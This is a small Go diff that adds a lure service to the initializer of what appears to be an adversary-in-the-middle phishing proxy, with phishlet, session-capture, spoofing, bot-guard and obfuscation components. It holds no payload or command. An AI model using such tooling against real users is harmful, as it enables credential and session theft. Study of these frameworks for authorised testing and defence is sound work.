@@ -319,6 +319,7 @@ func (ini *initializer) initProxy(version string) error {
 		Spoofer:        ini.spoofer,
 		PhishletSvc:    ini.phishletSvc,
 		SessionSvc:     ini.sessionSvc,
+		LureSvc:        ini.lureSvc,
 		PuppetSvc:      ini.puppetSvc,
 		TelemetrySvc:   ini.botGuardSvc,
 		Obfuscator:     ini.obfuscator,
